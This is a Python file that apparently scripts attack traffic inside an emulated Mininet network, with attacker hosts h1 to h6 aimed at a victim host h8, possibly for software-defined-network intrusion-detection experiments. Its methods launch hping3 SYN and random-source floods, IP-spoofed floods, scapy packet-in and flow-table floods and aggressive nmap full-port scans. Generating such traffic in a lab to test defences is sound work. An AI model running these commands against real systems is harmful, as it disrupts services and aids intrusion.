import random

class AttackManager:
    def __init__(self, net):
        self.net = net
        self.attackers = [net.get(f'h{i}') for i in range(1, 7)]
        self.victim = net.get('h8')
        self.active_pids = []

    # ================================
    # DDoS (High Diversity)
    # ================================
    def ddos_flood(self):
        print(f"[*] INTENSE DDoS: {len(self.attackers)} hosts -> {self.victim.IP()}")

        for attacker in self.attackers:
            for _ in range(10):  # tăng mạnh intensity
                cmd = (
                    f'hping3 --flood --rand-source '
                    f'-p {random.randint(1,65535)} '
                    f'{self.victim.IP()} --fast > /dev/null 2>&1 & echo $!'
                )
                pid = attacker.cmd(cmd).strip()
                self.active_pids.append((attacker, pid))

    # ================================
    # Packet-In Flood (Flow Explosion)
    # ================================
    def packet_in_flood(self):
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE Packet-In Flood từ {attacker.name}")

        for _ in range(10):
            cmd = (
                f'python3 -c "from scapy.all import *; '
                f'send(IP(dst=\\"{self.victim.IP()}\\")/'
                f'TCP(sport=RandShort(), dport=RandShort()), '
                f'loop=1, inter=0, verbose=0)" '
                f'> /dev/null 2>&1 & echo $!'
            )
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # Flow Table Overflow (Max Diversity)
    # ================================
    def flow_overflow(self):
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE Flow Overflow từ {attacker.name}")

        for _ in range(20):
            cmd = (
                f'hping3 --flood --rand-source '
                f'-S -p {random.randint(1,65535)} '
                f'{self.victim.IP()} --fast > /dev/null 2>&1 & echo $!'
            )
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # IP Spoofing (Entropy Booster)
    # ================================
    def ip_spoofing(self):
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE IP Spoofing từ {attacker.name}")

        for _ in range(15):
            fake_ip = f"10.0.0.{random.randint(100,250)}"
            cmd = (
                f'hping3 --flood --rand-source '
                f'-S -a {fake_ip} '
                f'-p {random.randint(1,65535)} '
                f'{self.victim.IP()} --fast > /dev/null 2>&1 & echo $!'
            )
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # Port Scanning (Aggressive)
    # ================================
    def port_scanning(self):
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE Port Scanning từ {attacker.name}")

        for _ in range(5):
            cmd = (
                f'nmap -sS -p 1-65535 -T5 --max-retries 1 '
                f'{self.victim.IP()} > /dev/null 2>&1 & echo $!'
            )
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # STOP ALL
    # ================================
    def stop_all(self):
        print("[*] Stopping all attacks...")
        for attacker, pid in self.active_pids:
            try:
                attacker.cmd(f'kill -9 {pid}')
            except:
                pass

        for host in self.attackers:
            host.cmd('pkill -9 hping3 nmap python3')

        self.active_pids.clear()
        print("[+] Attack stopped.")